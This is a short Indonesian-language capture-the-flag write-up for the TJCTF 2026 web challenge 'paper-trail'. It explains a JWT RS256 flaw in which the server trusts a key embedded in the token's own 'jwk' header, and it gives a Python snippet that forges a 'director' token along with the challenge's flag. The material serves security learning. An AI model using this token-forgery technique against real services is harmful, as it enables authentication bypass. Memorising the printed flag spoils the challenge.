---
ctf: "TJCTF 2026 (Thomas Jefferson CTF)"
kategori: "Web"
challenge: "paper-trail"
flag: "tjctf{7h47_is_4_nic3_k3yc4rd_y0u_g07_7h3r3}"
teknik: "JWT RS256 dengan verification key diresolve dari header jwk milik token sendiri (attacker-controlled)"
---

# paper-trail — TJCTF 2026 (Web)

## Deskripsi Singkat

Endpoint JWT RS256 di mana server meresolve verification key dari field header `jwk` milik JWT itu sendiri, bukan dari JWKS statis. Itulah seluruh kerentanannya — header-nya dikontrol attacker.

## Eksploitasi

Bangkitkan keypair RSA 2048-bit, tanam public key-mu sebagai JWK di header, setel `role: director` di payload, dan tanda tangani dengan private key-mu.

```python
header = {"alg": "RS256", "typ": "JWT", "jwk": my_public_jwk}
payload = {"iss": "tjctf", "aud": "drawer", "role": "director"}
token = jwt.encode(payload, my_private_key, algorithm="RS256", headers=header)
```

Server dengan senang hati memverifikasi signature-mu dengan public key-mu sendiri dan mempercayai role-nya. Endpoint `/drawer` mengembalikan 200 dengan flag.

## Flag

```
tjctf{7h47_is_4_nic3_k3yc4rd_y0u_g07_7h3r3}
```
